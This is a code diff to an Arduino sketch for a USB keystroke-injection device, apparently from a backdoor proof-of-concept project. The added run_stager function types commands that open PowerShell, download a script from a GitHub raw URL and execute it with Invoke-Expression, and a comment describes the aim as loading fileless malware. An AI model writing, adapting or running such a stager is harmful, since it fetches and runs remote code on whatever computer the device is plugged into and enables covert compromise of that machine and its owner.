@@ -22,6 +22,19 @@ void loop() {
   // We won't need loop. Could use it, don't want to spam keyboard...
 }
 
+void run_stager(){
+  // Run stager so we can load fileless malware.
+  open_run();
+  Keyboard.print("Powershell.exe");
+  Keyboard.write(KEY_RETURN);
+  delay(200);
+  Keyboard.print('$uri = "https://raw.githubusercontent.com/jarviscodes/32u4_backdoor_poc/master/test/hiddenPayload.ps1";');
+  Keyboard.write(KEY_RETURN);
+  Keyboard.print('$script_content = $(Invoke-WebRequest($uri)).Content;');
+  Keyboard.write(KEY_RETURN);
+  Keyboard.print('Invoke-Expression $script_content ;');
+}
+
 void send_payload(){
   Keyboard.print("calc.exe");
   Keyboard.write(KEY_RETURN);
